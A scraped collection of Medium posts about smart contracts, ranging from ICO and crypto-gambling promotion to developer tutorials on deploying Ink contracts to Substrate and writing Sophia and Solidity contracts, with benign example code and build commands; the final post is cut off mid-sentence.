{"title": "", "author_name": "Noah Ruderman", "link": "https://medium.com/@noahruderman/the-actual-content-is-stored-on-chain-through-smart-contract-function-calls-b3bd2a7fa5e9?source=search_post", "post_date": "Feb 27", "readtime": "", "upvotes": "2", "content": "Noah RudermanBlockedUnblockFollowFollowingFeb 27The actual content is stored on chain through smart contract function calls. All of the basic operations you\u2019d expect in a service (e.g. order a product, create a vendor profile, create a listing, etc.) will have a corresponding function call. In this way, you\u2019d say that the backend is decentralized, or that the backend is hosted on a blockchain cloud. Instead of API calls to a central server, it\u2019s API calls (i.e. txes) to a smart contract.3rd parties can offer a node as a service over Tor, so you go to some url and interact with a frontend connected to the dapp without having to run a node (the 3rd party runs the node and sends txes on your behalf). Most users won\u2019t even know the backend service is really hosted on a blockchain rather than a private server. The 3rd party can make by charging you a service fee when you make orders.If you want more privacy or security, you can run a full node and access the dapp through a browser extension which runs some frontend code that uses RPC calls to interact with your node.", "responses": ""}, {"title": "PROVOCO Smart contract deployment", "author_name": "PROVOCO", "link": "https://medium.com/@Provocome/provoco-smart-contract-deployment-8b8d1666e2ed?source=search_post", "post_date": "Jul 9, 2018", "readtime": "3 min read", "upvotes": "101", "content": "PROVOCO Smart contract deploymentPROVOCOBlockedUnblockFollowFollowingJul 9, 2018Provoco team are happy to announce that crowdsale smart contract successfully audited, tested and deployed on Ethereum mainnet!We are giving our community the chance to review the smart contract that will guide the process of accepting funds and distributing VOCO tokens!The smart contracts are built upon Solidity code, all of which is publicly available for audit, comment and review.Inspect smart\u00a0contractWhat is Smart contract?Smart Contracts are self executing code blocks deployed on the Ethereum blockchain. They contain data & code functions. Contracts make decisions, interact with other contracts, store data and transfer Ether (the unit of crypto-currency in the Ethereum blockchain) among users.Security auditERC20Recently our team decided to change token standard. The token contract is the it\u2019s a fairly standard ERC20 smart contract! Its code is only a couple of lines:During the development of the contracts suite, it was of high importance to us to guarantee that what is written in the whitepaper will actually be enforced in the code of the smart contracts.We believe in keeping the promises we make to our contributors and to the world. To that end, we put in a lot of effort into the development of the crowdsale smart contracts in order to ensure that we enforce in code everything we promised on paper.And now, it\u2019s all on the blockchain, so there\u2019s no going\u00a0back!Also don\u2019t forget to follow us on social media for latest\u00a0updates:It\u2019s time to challenge ourselves and others around\u00a0us!", "responses": "1"}, {"title": "", "author_name": "Crypto Lover", "link": "https://medium.com/@Rana590/ethereum-limited-is-a-smart-contract-creation-platform-2fc6441cb6d?source=search_post", "post_date": "Jun 27, 2018", "readtime": "", "upvotes": "", "content": "Crypto LoverBlockedUnblockFollowFollowingJun 27, 2018Ethereum Limited is a smart contract creation platform. We noticed that not everyone has the ability to write a smart contract since it requires some level of programming skills so we decided to make it easier for everyone to create a smart contract. #ICO #ETHL #ETHLIMITEDBounty: https://bitcointalk.org/index.php?topic=4539121.0", "responses": ""}, {"title": "Actualizaci\u00f3n de \u00e6pps: Desarrollo de Smart\u00a0Contract", "author_name": "\u00e6ternity", "link": "https://blog.aeternity.com/actualizaci%C3%B3n-de-%C3%A6pps-desarrollo-de-smart-contract-fadc4a66ead6?source=search_post", "post_date": "Aug 31, 2018", "readtime": "4 min read", "upvotes": "", "content": "Actualizaci\u00f3n de \u00e6pps: Desarrollo de Smart\u00a0ContractEn \u00e6ternity, la experiencia del desarrollador es tan importante para nosotros como la experiencia que tuvieron los usuarios finales de nuestras \u00e6pps. Por este motivo, creamos varias herramientas para desarrolladores y tutoriales para permitir que cualquiera pueda interactuar con nuestra blockchain. Antes del lanzamiento de nuestra Mainnet, realizaremos algunas publicaciones de blog espec\u00edficamente para desarrolladores a los que les gustar\u00eda construir en nuestra blockchain.\u00e6ternityBlockedUnblockFollowFollowingAug 31, 2018Audiencias de DesarrolladoresDentro de la audiencia de desarrolladores, actualmente estamos atendiendo a tres sub-audiencias: desarrolladores de smart contract, desarrolladores familiarizados con JavaScript (que se ejecuta en el navegador o en el back-end) y desarrolladores de Python. Esta publicaci\u00f3n est\u00e1 dedicada espec\u00edficamente a desarrolladores de smart contract.\u00bfQu\u00e9 son los Smart Contracts de \u00e6ternity?Los Smart Contracts son programas que viven en la blockchain y permiten a los usuarios formalizar acuerdos entre ellos. Las m\u00e1quinas virtuales que se ejecutan en nodos ejecutan los contratos, por lo que los nodos reciben comisiones. Se ejecutar\u00e1 un contrato cuando reciba notificaciones de un evento del mundo exterior, como la transferencia de un pago de un usuario o alg\u00fan otro evento del mundo real identificado por un oracle.Los contratos deben compilarse antes de que se carguen en la blockchain. Epoch compilar\u00e1 contratos, pero los compiladores externos estar\u00e1n disponibles tambi\u00e9n. El bytecode compilado se almacena en la cadena y se ejecuta por los nodos. Esta ejecuci\u00f3n utiliza la potencia de la CPU en los nodos, por lo que se paga con gas.Lenguaje Sophia Smart Contract y Herramientas para Desarrolladores de Smart\u00a0ContractPara el lanzamiento de nuestra Mainnet, respaldaremos el lenguaje Sophia smart contract. Puedes obtener m\u00e1s informaci\u00f3n sobre lo que hace que Sophia sea un excelente lenguaje smart contract en una de nuestras publicaciones anteriores, en nuestro webinar Sophia, un lenguaje funcional blockchain, as\u00ed como en Github.Hemos implementado una Testnet compatible con nuestros \u00e6pps SDKs aqu\u00ed. Los desarrolladores tambi\u00e9n pueden ejecutar su propio Testnet siguiendo esta gu\u00eda.Testnet Tokens\u00a0FaucetPara adquirir Tokens de Testnet necesarios para ejecutar y probar smart contracts, los desarrolladores pueden usar nuestro Testnet faucet: https://faucet.aepps.com/ Todo lo que necesitan hacer es ingresar su direcci\u00f3n p\u00fablica y hacer clic en \u201cTop up!\u201d.Herramienta Web de ContratosLos desarrolladores de smart contract pueden escribir, implementar y llamar smart contracts utilizando la herramienta web que creamos para este fin: https://contracts.aepps.com/. La herramienta est\u00e1 conectada a la \u00e6pps Testnet mencionada anteriormente.As\u00ed es como luce la herramienta de smart contract anterior despu\u00e9s de compilar un contrato para bytecode:Actualmente este editor de contrato usa una cuenta a la que se le ha dado mucho gas. Siempre se ejecuta en el contexto de esta cuenta, lo que lo hace adecuado para las pruebas. Por supuesto, en el futuro, los desarrolladores ejecutar\u00e1n este editor en el contexto de sus propias cuentas, utilizando su propio gas. Cualquiera que desee ejecutar el editor por s\u00ed mismo puede encontrarlo en su repositorio de GitHub, https://github.com/aeternity/aepp-contracts.Mainnet WorkflowUna vez que la Mainnet est\u00e9 activa, el flujo de trabajo ser\u00e1 muy similar. Los usuarios a\u00fan podr\u00e1n usar nuestra herramienta de contratos, pero esperamos que cada vez m\u00e1s desarrolladores opten por ejecutarla ellos mismos, y esperamos que terceros desarrollen herramientas para trabajar con nuestros contratos.Pr\u00f3ximamenteEn nuestras pr\u00f3ximas publicaciones discutiremos c\u00f3mo los desarrolladores de aplicaciones pueden usar nuestros SDK de JavaScript y Python para construir sobre la blockchain de \u00e6ternity. Como siempre, permanece atento a las actualizaciones m\u00e1s interesantes relacionadas con nuestras \u00e6pps y herramientas de desarrollo y no dudes en contactarnos directamente en nuestro Foro y en GitHub.", "responses": ""}, {"title": "Ethereum Smart Contract Support in Bluzelle\u2019s Lovelace\u00a0Release", "author_name": "Bluzelle", "link": "https://blog.bluzelle.com/ethereum-smart-contract-support-in-bluzelles-lovelace-release-f8ff22a2b906?source=search_post", "post_date": "Aug 13, 2018", "readtime": "2 min read", "upvotes": "", "content": "Ethereum Smart Contract Support in Bluzelle\u2019s Lovelace\u00a0ReleaseBluzelleBlockedUnblockFollowFollowingAug 13, 2018With Ethereum Solidity smart contracts, the key idea is to write a smart contract that employs the Bluzelle libraries to make CRUD requests. These requests get routed through Oracalize through to the swarm and then responses are sent back through Oracalize to your smart contract. It is important then to implement a listener to process the responses. This asynchronous request-response pattern is how your Ethereum dApp should be structured.In your dApp, make sure you are importing the bluzelle.sol file from:https://github.com/bluzelle/bluzelle-sol/blob/master/contracts/BluzelleClient.solPlease note that BluzelleClient smart contract can always be modified if the user wishes to have a more robust or more secured dapp.The BluzelleClient contains all the expected CRUD operations that are needed to talk to a Bluzelle swarm. One simply imports this utility smart contract, and calls any of the four functions: read(string key), remove(string key), set(string key, string data), update(string key, string data) and create(string key, string data).The file SampleDapp.sol:https://github.com/bluzelle/bluzelle-sol/blob/master/contracts/SampleDapp.solshowcases how to use these four functions to communicate data with the bluzelle swarm:/* Read the value from Bluzelle (this requires a small fee to pay Oracalize) */Function getValue(string _key) onlyOwner public payable{     read(_key);}", "responses": ""}, {"title": "Deploying an Ink Smart Contract to a Substrate Chain", "author_name": "Ross Bulat", "link": "https://medium.com/block-journal/deploying-an-ink-smart-contract-to-a-substrate-chain-f52a2a36efec?source=search_post", "post_date": "May 8", "readtime": "10 min read", "upvotes": "50", "content": "Deploying an Ink Smart Contract to a Substrate ChainTesting, compiling and deploying Ink contracts, and how to call functions with Polkadot\u00a0JSRoss BulatBlockedUnblockFollowFollowingMay 8Development around Parity\u2019s Substrate blockchain framework is well underway, with the ability to deploy Ink based smart contracts now available\u200a\u2014\u200aalbeit in an early stage. This article will walk through the compiling and deployment process for an Ink smart contract, before visiting the means of calling contract functions through the Polkadot JS client.This is the final part in a 3-part series exploring the Ink smart contract creation process in conjunction with Substrate blockchains, from installation to deployment. The previous article, dedicated to the Ink contract writing process, can be found here:Writing a Substrate Smart Contract with InkExploring Ink syntax and Rust concepts with a Non-Fungible Token smart contractmedium.comThe Non-fungible token smart contract we\u2019re working with is available in full here on Github.Testing Ink ContractsTesting an Ink smart contract can (and should) be done both off-chain and on-chain. The prior can be done via a tests module within the contract itself, and the latter on a local Substrate dev chain.In my experience, I have caught contract errors once that contract was compiled and deployed. Highlighting the importance of on-chain testing. These errors managed to bypass the testing module and compilation process, so it is critical to test the entire contract on a test chain in addition to test modules. The Polkadot JS UI, that we\u2019ll visit further down, allows us to do this with ease.Your first means of testing an Ink contract is via the tests module under your contract! macro. The boilerplate looks like the following:// test function boilerplate#[cfg(all(test, feature = \"test-env\"))]mod tests {      use super::*;   use std::convert::TryFrom;   #[test]   fn it_works() {      // test function...   }}The test functions are wrapped in a separate tests module, that import everything from the parent module and thus knows about everything about the smart contract in question. Let\u2019s break down some of the more ambiguous lines of code, starting with the top cfg flag.// config flag to only compile in a test environment#[cfg(all(test, feature = \"test-env\"))]Tests are not compiled with the smart contract\u200a\u2014\u200athey would take up unnecessary space on chain. We\u2019ve also included two use statements within the tests module:// use everything from super module (the smart contract)use super::*;// use the TryFrom trait - allowing safe type conversionsuse std::convert::TryFrom;The first line, super::* is quite self explanatory; the tests module needs to be aware of the smart contract it is testing, so everything is bought into scope with * from the parent module\u200a\u2014\u200athe smart contract itself. The second argument brings the TryFrom trait into scope.The TryFrom trait implements simple and safe type conversions that may fail in a controlled way under some circumstances.We use the try_from() method, derived from the TryFrom trait, to try to obtain AccountId addresses for use in our testing. This is in fact the first thing we do within the it_works() test after initialising a contract instance:#[test]fn it_works() {   // initialise a contract instance to test   let mut _nftoken = NFToken::deploy_mock(100);   // try to obtain alice's account   let alice = AccountId::try_from([0x0; 32]).unwrap();   ...}An AccountId in Substrate consists of 32 characters, therefore Alice\u2019s address is simply declared as 32 zeros. The account is unwrapped to obtain the actual address from either a Result or Error enum.Note: We covered the Rust concept of unwrapping in the previous article.A #[test] statement exists before the function definition; this is Rust syntax that lets the compiler know we intend this function to be a test function. VS Code will embed a test button under each function that is labelled as a test in this way\u200a\u2014\u200abut clicking this button to invoke cargo test will fail, as we need a slightly modified test command to test Ink contracts. We will visit that command further down.Within it_works(), we initialise a mutable instance of the contract using deploy_mock(), a mock deployment function provided by the Ink framework. The contract can now be called and manipulated via the _nftoken variable. deploy_mock() will call the contract\u2019s deploy() method\u200a\u2014\u200awhich expects an init_value argument\u200a\u2014\u200aso the value of 100 has been provided, consequently minting 100 tokens at test runtime.Using Assertions in\u00a0TestsFrom here the rest of it_works() is simple to follow. We have taken advantage of Rust\u2019s assertion macros to ensure that our contract\u2019s state is changing as we expect when transferring tokens and approving other accounts to send tokens.Rust includes three assertion macros available for us to use in the standard library:// assert! - true or falseassert!(some_expression());// assert_eq! - asserts that 2 expressions are equalassert_eq!(a, b, \"Testing if {} and {} match\", a, b);// assert_ne! - asserts that 2 expressions are not equalassert_ne!(a, b, \"Testing that a and b are not equal\");Where an assertion fails, the test function will also fail and be reported as a failure once the tests complete. to test our Ink contract we run the following command:cargo test --features test-env -- --nocaptureUsing --no-capture will provide more verbose output, including println() output where it has been used within the tests module. The test-env feature ensures that we are only testing the Ink environment, as defined in Cargo.toml:[features]default = []test-env = [    \"ink_core/test-env\",    \"ink_model/test-env\",    \"ink_lang/test-env\",]...A successful test will result in the following output:it_works() passed, outputting a result of\u00a0okCompiling the\u00a0contractWith tests passing, we can now compile the contract. Run build.sh within the project directory to do so:./build.shThe resulting files will be sitting in your target/ folder:nftoken.watnftoken-fixed.watnftoken.wasmnftoken-opt.wasmnftoken-pruned.wasmNFToken.jsonInk contracts are compiled into the web binary standard WebAssembly, or\u00a0.wasm. We are interested in two files from the above compiled output that we will upload to Substrate:nftoken-pruned.wasm: an optimised\u00a0.wasm file we\u2019ll upload to our Substrate chainNFToken.json: the contract ABI code in JSON formatNote: Although we are not WebAssembly focussed, it is worth mentioning that the format is being heavily used in the blockchain space for a more efficient runtime. Ethereum 2.0 will rely on a subset of WebAssembly they have dubbed eWasm, and of course, Substrate chains are also adopting the standard. Although primarily aimed for the web, WebAssembly is by no means limited to the browser. The WebAssembly spec is under development and we can expect more features to be released in the coming years, making it a very interesting technology to work with.You may be familiar with contract ABI from Ethereum based contracts, that provide front-end Dapps the means to communicate to the contract on-chain. They essentially describe the structure of the contract including its functions and variables within a JSON object, making it particularly simple for Javascript based apps to integrate.Now, to deploy the contract, spin up your local Substrate chain if you have not done so already, and let\u2019s turn to the Polkadot JS app to manage our deployment.# run your local Substrate chainsubstrate --devDeploying Ink ContractsDeploying and instantiating a contract on a Substrate chain involves firstly deploying the contract, and then instantiating it. This two step process allows developers to deploy a particular standard\u200a\u2014\u200aperhaps a token standard\u200a\u2014\u200awhere other interested parties could then instantiate that same contract with their own token details. This removes the need to upload duplicates of the same contract for essentially identical functionality and identical ABI code.To reiterate, this two step process involves:Uploading the contract onto a Substrate chainInstantiating the contract, which can then be interacted withBoth these tasks can be achieved via the Polkadot JS app, an open source Typescript and React based project available on Github.Polkadot JSNow we\u2019ll be uploading our compiled\u00a0.wasm and\u00a0.json ABI to a Substrate dev chain. To do so, the Polkadot JS client is needed.You can either clone the project to run on your local machine, or simply visit https://polkadot.js.org/apps to access it online. Load up the client to commence the deployment process that follows.Step 1: Ensure the client is connected to your local Substrate nodeWe firstly need to ensure that the client is connected to the correct chain. Navigate to the Settings tab and ensure that the remote node/endpoint to connect to is set to Local Node (127.0.0.1:9944). Hit Save and Reload if a change is needed.Note: The other chains, Alexander and Emberic Elm, are Substrate based chains that are managed by Parity. Working with other Substrate chains such as Polkadot is out of the scope of this article, however, the Pokakdot JS client is actually designed to work with any Substrate based blockchain, and therefore is extremely dynamic in what is presented throughout the app.Step 2: Deploy the compiled contract onto your nodeTo deploy our contract, navigate to the Contracts page from the side bar, and ensure you are on the Code tab. If you have not yet deployed a contract onto your node, the Code tab will be the only one available. The UI will be similar to the following:Polkadot JS -> Contracts -> Code\u00a0tabNow on the Code tab:Ensure the deployment account is set to ALICE. Alice will have a sufficient balance for us to deploy, instantiate and test the contractDrag nftoken-pruned.wasm onto the compiled contract WASM fieldOptional: Amend the code bundle name value for a more human-friendly nameDrag NFToken.json onto the contract ABI fieldSet the maximum gas allowed to 500,000 to ensure that we supply enough gas to process the transactionOnce configured, hit Deploy and then confirm once again. The transactions will take place and the contract will be deployed.Step 3: Instantiating the contractYou will now notice that two additional tabs are available, Instance and Call. We will firstly use the Instance tab to instantiate the contract, then the Call tab to test our functions. The Instance tab will resemble something similar to the following:Polkadot JS -> Contracts -> Instance\u00a0tabWithin the Instance tab:Check the code for this contract value is pointing to your deployed contractSet an initial token amount to be minted as the initValue value.Note: The Polkadot UI is now picking up on our contract structure, and specifically the arguments that need to be supplied for the deploy function we defined for the contract, including the expected data type. This is one example of the dynamic nature of the Polkadot UI and how its designed to cater for a wide-range of contract types.Set the endowment value to 1,000 to ensure the new contract account is minted with some value. This is an advised value from the official Ink docs. Like Ethereum contracts, Ink contracts are deployed to a separate address with their own unique AccountId and balance.Again, set the maximum gas allowed to 500,000 to ensure that we supply enough gas for the transactionHit Initiate and confirm to carry out the transactionUpon a successful transaction, the contract will now be instantiated and functions callable.Step 4: Calling functions from instantiated contractOur final job is now to ensure that functions are working as expected. You will notice that all the pub(external) functions we defined in the contract are now available to call and test within the Call tab:Ability to call contract functions within Polkadot\u00a0JSPolkadot JS does not yet provide feedback from calls in the client itself, but your node feed in your terminal should reflect the transactions as new blocks are validated. What we have in terms of UX now are success or failure event notifications that pop up on the top right of your browser window as a function call is processed.Note: Feedback mechanisms will be posted here as and when they become available, either on the command line or in the Polkadot JS client.", "responses": ""}, {"title": "Blockchain time. Part 1: Advertising Smart\u00a0Contract", "author_name": "World Wi-Fi", "link": "https://medium.com/@WorldWifi_ICO/blockchain-time-part-1-advertising-smart-contract-f46fe80cb80d?source=search_post", "post_date": "Sep 27, 2018", "readtime": "2 min read", "upvotes": "", "content": "Blockchain time. Part 1: Advertising Smart\u00a0ContractWorld Wi-FiBlockedUnblockFollowFollowingSep 27, 2018So here we are, telling about World Wi-Fi private blockchain again. Today we\u2019ll talk about advertising smart contracts, that is a necessary part of our platform.Smart contract is an electronic algorithm intended for the automation of the contract execution process in the blockchain. The general idea of smart contracts is to exclude divergences in the treatment of the agreement terms by the entered parties.How it works?The advertising distributor\u2019s (hotspot owner\u2019s) personal account will contain as much information as possible about the whole system. World Wi-Fi is up to launch the private blockchain to solve the problem of possible data falsification, to control the fact of displaying of advertising materials, as well as to guarantee fulfillment of obligations on remuneration in favor of the router owner.Blockchain is used to store reliable information about payments and accounts of users. Each transaction is serviced by a contract (deal). The deal actually plays the role of an advertising agency. It is necessary for both parties to be sure that the advertising budget will reach its destination and get converted into the planned number of displays. The WeToken smart contract guarantees that payments will be transferred as soon as the task set within the Deal has been reached.Once again, but shorterIn an advertising campaign, we have two parties\u200a\u2014\u200aadvertisers and distributors. The first ones pay for the campaign at its beginning, and this amount of money is saved with the smart contract. As soon as distributor shows the ad, money will be transferred to distributor\u2019s e-wallet, safe and sound.Advertising smart contracts are important, but not the only part of World Wi-Fi private blockchain. One more part of the story is coming up next week. Stay tuned!", "responses": ""}, {"title": "", "author_name": "Jason Goldberg", "link": "https://medium.com/@betashop/also-eric-i-think-plasma-is-also-scaling-one-smart-contract-cd3c4889cf22?source=search_post", "post_date": "Sep 12, 2018", "readtime": "", "upvotes": "", "content": "Jason GoldbergBlockedUnblockFollowFollowingSep 12, 2018Also, Eric: I think plasma is also scaling one smart contract. I don\u2019t think anyone has yet found a way to communicate cross-chain with Plasma?Sharding has 3 ingredients:Divide work into shardsCommunicate between shards3.Economic finality on each shardMosaic = Sharding at Layer 2, on-chain, finalised on ETHv1.0", "responses": ""}, {"title": "Actualizaci\u00f3n de \u00e6pps: Lenguaje Sophia Smart\u00a0Contract", "author_name": "\u00e6ternity", "link": "https://blog.aeternity.com/actualizaci%C3%B3n-de-%C3%A6pps-lenguaje-sophia-smart-contract-c62ca3d6fdcd?source=search_post", "post_date": "Jul 4, 2018", "readtime": "4 min read", "upvotes": "", "content": "Actualizaci\u00f3n de \u00e6pps: Lenguaje Sophia Smart\u00a0ContractEn \u00e6ternity continuamos migrando nuestras \u00e6pps a la Testnet de \u00e6ternity en preparaci\u00f3n para el lanzamiento de la Mainnet. Mientras tanto, estamos trabajando en una serie de herramientas y tutoriales para desarrolladores, que nos gustar\u00eda compartir en las pr\u00f3ximas actualizaciones de\u00a0\u00e6pps.\u00e6ternityBlockedUnblockFollowFollowingJul 4, 2018Al momento del lanzamiento de la Mainnet, \u00e6ternity ofrecer\u00e1 dos idiomas de contrato inteligentes: Sophia y Varna. Hablaremos de Varna en una publicaci\u00f3n separada. Hoy estamos enfocados en Sophia.Lenguaje Sophia Smart\u00a0ContractSophia es el m\u00e1s expresivo de los dos lenguajes de contrato inteligentes. En los siguientes p\u00e1rrafos, repasaremos algunas de las caracter\u00edsticas que lo convierten en un lenguaje de contrato inteligente superior. Hemos escrito un tutorial que explica e ilustra algunas de estas caracter\u00edsticas como ejemplos de c\u00f3digo.Programaci\u00f3n FuncionalSophia es un lenguaje funcional en la familia ML. Hemos elegido el paradigma de programaci\u00f3n funcional porque facilita la escritura de programas correctos, algo que es particularmente importante con los contratos inteligentes. Las cualidades de los lenguajes funcionales que los hacen (potencialmente) m\u00e1s confiables que los programas escritos usando el paradigma imperativo incluyen estado mutable restringido, menos efectos secundarios, componentes de c\u00f3digo m\u00e1s f\u00e1ciles de leer, mejor manejo de concurrencia y facilidad de depuraci\u00f3n y prueba.EstadoSophia no tiene un estado mutable arbitrario, sino solo una forma limitada de estado asociada a cada instancia de contrato. Puedes encontrar un ejemplo de c\u00f3digo espec\u00edfico del estado y las formas de acceder al estado aqu\u00ed.Fuertemente TipificadoSophia es un lenguaje fuertemente tipado, lo que significa que el compilador verifica si el valor asignado a una variable es efectivamente el tipo que se declar\u00f3 para esta variable al momento de la compilaci\u00f3n. Ser capaz de especificar y probar autom\u00e1ticamente las propiedades de un contrato inteligente hace de Sophia un lenguaje de contrato inteligente m\u00e1s seguro.Objetos First\u00a0ClassEn Sophia, los siguientes componentes son objetos first class: contratos inteligentes, or\u00e1culos, nombres y canales de estado. Esto significa que est\u00e1n disponibles directamente, en lugar de estar definidos por librer\u00edas de c\u00f3digos haciendo que estos objetos sean m\u00e1s f\u00e1ciles de acceder, m\u00e1s econ\u00f3micos a la vez que reduce la complejidad del c\u00f3digo.Coincidencia de\u00a0PatronesSophia presenta una coincidencia de patrones basada en ReasonML que permite un flujo de control optimizado y la capacidad de construir declaraciones de control f\u00e1ciles de leer.Un Ejemplo de CrowdfundingPara ilustrar algunas de las caracter\u00edsticas mencionadas anteriormente, hemos escrito un ejemplo simple de un contrato inteligente de la Campa\u00f1a de Crowdfunding, que nos gustar\u00eda compartir:/* * A simple crowd funding example. * Not production code (do not use)! */contract FundMe =type state = { contributions : map(address, uint),total : uint,beneficiary : address,deadline : uint,goal : uint }private function require(b : bool, err : string) =if(!b) abort(err)public function init(beneficiary, deadline, goal) : state ={ contributions = Map.empty,beneficiary = beneficiary,deadline = deadline,total = 0,goal = goal }// \u2014 API \u2014// Contribute to the projectpublic stateful function contribute() =require(chain.height < state.deadline, \u201cDeadline has passed\u201d)let amount =switch(Map.lookup(call.caller, state.contributions))None => call.amountSome(n) => n + call.amountput(state{ contributions[call.caller] = amount,total = state.total + call.amount })// Withdraw funds after the deadline.public stateful function withdraw() =require(chain.height >= deadline, \u201cCannot withdraw before deadline\u201d)if(call.caller == state.beneficiary)withdraw_beneficiary()elif(is_contributor(call.caller))withdraw_contributor()elseabort(\u201cNot a contributor or beneficiary\u201d)// \u2014 Private functions \u2014private function is_contributor(addr) =Map.member(addr, state.contributions)private stateful function withdraw_beneficiary() =require(state.total >= state.goal, \u201cProject was not funded\u201d)transaction(SpendTx({recipient = state.beneficiary,amount = state.total }))put(state{ beneficiary = #0 })private stateful function withdraw_contributor() =require(state.total < state.goal, \u201cProject was funded\u201d)let to = call.callertransaction(SpendTx({recipient = to,amount = state.contributions[to]}))put(state{ contributions[to] = 0 })Futuro CercanoAdem\u00e1s del progreso continuo de \u00e6pps, estamos trabajando en una serie de nuevas herramientas de desarrollo que anunciaremos pronto. Est\u00e9n atentos para m\u00e1s y como siempre si\u00e9ntanse libres de contactarnos directamente en el Foro o en GitHub.", "responses": ""}, {"title": "What is a smart contract?", "author_name": "DAO.Casino Team", "link": "https://medium.com/@dao.casino/what-is-a-smart-contract-b7c1ac5d7661?source=search_post", "post_date": "Sep 26, 2018", "readtime": "4 min read", "upvotes": "", "content": "What is a smart contract?DAO.Casino TeamBlockedUnblockFollowFollowingSep 26, 2018How it links to blockchain and how it makes online gambling betterSmart contracts are appearing more than ever, so it makes sense for you to know just how straightforward and beneficial they can be. Read on to find out everything you need to know about their background, growing popularity and how they are a natural fit for online gambling.What exactly is a smart contract and how long have they been around?First thing\u2019s first. What exactly are smart contracts? Quite simply, they are lines of code that are stored on a blockchain and are self-executing when predetermined terms and conditions are met. That means contracts can automatically occur without the need for outside interference.They were originally created in 1994 by cryptographer and legal scholar Nick Szabo, who wanted the \u201chighly evolved\u201d legal contracts system to be used for a faster and more secure way to do business in digital currency. The rapid growth and continued success of blockchain has meant smart contracts are more prominent than ever.What is the difference between a regular contract and a smart contract?The difference between a regular contract and a smart contract is not in the contract itself, but in the administration of the contract. While there are numerous benefits to a smart contract over its traditional form, the main ones are speed, efficiency and security. With a regular contract, there would most likely be a credit check, various administrative forms to fill out and interactions with different people who would add to your fees and commissions.With a smart contract the process is far simpler. As your identity has already been stored on a blockchain, lenders can make a decision about credit a lot quicker. And you don\u2019t have to worry about someone intervening, changing the deal or even cancelling it. Computer code is also more exact than the legalese that traditional contracts are written in.Smart contracts without blockchain and other factorsImage by BlockgeeksIt is worth noting that smart contracts can exist without blockchain. However, perhaps more importantly, this would mean it would lose all the major benefits. As such, data could be changed, manipulated, moved or deleted, or even be unrecorded. As blockchain is a digital ledger in which transactions made in bitcoin or another cryptocurrency are recorded chronologically and publicly, it is clear why smart contracts are so popular.However, there are several extra things to consider. Smart contracts work best when the terms of the contract are more straightforward, as automated agreements do not suit complicated terms open to interpretation. While hacking into smart contracts can happen, it is worth remembering that automated contracts are among the most secure items on the internet. Blockchain transaction records are encrypted, meaning each individual record is connected to previous and subsequent records on a distributed ledger, so the whole chain would need to be altered to change a single aspect.As smart contracts can be entered into pseudonymously, it could be tricky as to who you want to resolve any issue with. That is why some contracts may consider adding an arbitration cause so as to cover that eventuality. The planning part is vital and any exceptions to any rules must be agreed upon in advance. Within a smart contract, there can be as many stipulations as the participants desire.Smart contracts for business sectors, including online gamblingAs well as the speed, cost-reduction, transparency and added security, there are further benefits to businesses. As companies are even more aware about the environment there does not need to be the mountain of papers as it is all done virtually. Smart contracts also record everything, meaning in the event of data loss it is all easily retrievable. Industries built upon long-standing rules and algorithms such as banking, insurance and healthcare would be a natural fit for smart contracts.The advantages of smart contracts really do work well within the gambling industry too. And we know how to maximise it for your satisfaction. Unlike with regular casinos, you do not have to worry about the payment taking days to go through or winnings being withheld. And the scale of games in the betting sector merges well with smart contracts. Whether the bet is made for small or large amounts, a third party never needs to get involved. And on games where randomness is a big part of the appeal, such as a roulette or dice game, we use provably fair algorithms, a tool that verifies each roll result and guarantees to be fair.We know how to fully maximise smart contracts within our business to make things quicker, safer, cheaper and more efficient and transparent for you. The more you trust us, the more you have to gain.", "responses": "2"}, {"title": "Valentine\u2019s Day Sale, Smart Contract, and\u00a0AGA", "author_name": "Gifto Official", "link": "https://medium.com/@gifto/valentines-day-sale-smart-contract-and-aga-b581b607c6d2?source=search_post", "post_date": "Feb 19", "readtime": "2 min read", "upvotes": "", "content": "Valentine\u2019s Day Sale, Smart Contract, and\u00a0AGAGifto OfficialBlockedUnblockFollowFollowingFeb 19News Roundup- February 19, 2019Valentine\u2019s Day\u00a0Sale!How did you spend your Valentine\u2019s Day? If you live in Taiwan, you might have bought a gift for your loved one from Gifto\u2019s E-Commerce platform during our Valentine\u2019s Day sale. The launch of our E-Commerce platform has been another step in improving the functionality of the Gifto wallet. Wallet holders can send GTO gifts, store their tokens, and for users in Taiwan, exchange uDiamonds to GTO and buy real E-Commerce goods using our token.With E-Commerce now live, Gifto is leveraging the platform as a way to drive GTO usage, with each purchase presenting another piece of evidence in the case that Gifto, and crypto-currencies in general, can drive real economic value using blockchain technology.AGA with Nicholas Ray, GM of Gifto\u00a0BeijingThis Friday at 10:00 AM (GMT+8) we\u2019re back with the first AGA after the Chinese New Year! Hosting the live stream will be Gifto GM, Nicholas Ray. Join Nick as we sit down to tackle community questions during our interactive live stream\u200a\u2014\u200ayou may even win GTO from one of our signature Gifto Packet virtual gifts.Ask Gifto Anythings (AGA\u2019s) are bi-weekly live streams where the Gifto team sits down to update the community on the most recent Gifto news and answer the most-asked community questions. Live streams are interactive and always a good time, so make sure you don\u2019t miss out. Catch the live stream on CoinUp Network on February 19 th, 2019!Smart Contract coming before the end of\u00a0Q1As a sign of our long-term commitment to the success of the Gifto project, the team committed to locking up \u201cCompany Reserve\u201d tokens (250 MM) until January 2021, as well as providing a transparent release schedule for our \u201cPowering the Ecosystem\u201d reserves. As an update we want to let you know that we are hard at work making sure these commitments will be delivered before the end of Q1. Read the details of our token release schedule and smart contract lockup here, and look forward to more updates as we continue to plow through the quarter.The vesting period begins in January 2021 and ends in December\u00a02022Follow Gifto on Twitter, Telegram, Facebook, and Linkedin!", "responses": ""}, {"title": "", "author_name": "Yves Mulkers", "link": "https://medium.com/the-data-intelligence-connection/solving-blockchains-security-problem-one-smart-contract-at-a-time-b418eea29d5a?source=search_post", "post_date": "Mar 17, 2018", "readtime": "2 min read", "upvotes": "", "content": "Yves MulkersBlockedUnblockFollowFollowingMar 17, 2018Solving blockchain\u2019s security problem one smart contract at a\u00a0timeSecurity has held significant weight in arguments against enterprise blockchain initiatives. Endpoint vulnerabilities, risks of malware to keys, alack of regulation and more have created hesitation in a space ripe for innovation\u200a\u2014\u200awith the right security protocols.\u201cThere was nobody in this space that we saw laser focused on just blockchain security,\u201d said Hartej Sawhney (pictured), senior advisor at Pink Sky Capital and cofounder of blockchain security company Hosho.io. \u201cSo we began focusing on auditing smart contracts\u00a0\u2026 and then putting a seal of approval on that\u201d to mitigate risk.After seeing the low quality of smart contracts surrounding initial coin offerings at crypto hedge funds, Sawhney and his partner Yo Sub Kwon set out to create Hosho as an efficient, reliable auditing tool. Sawhney spoke with John 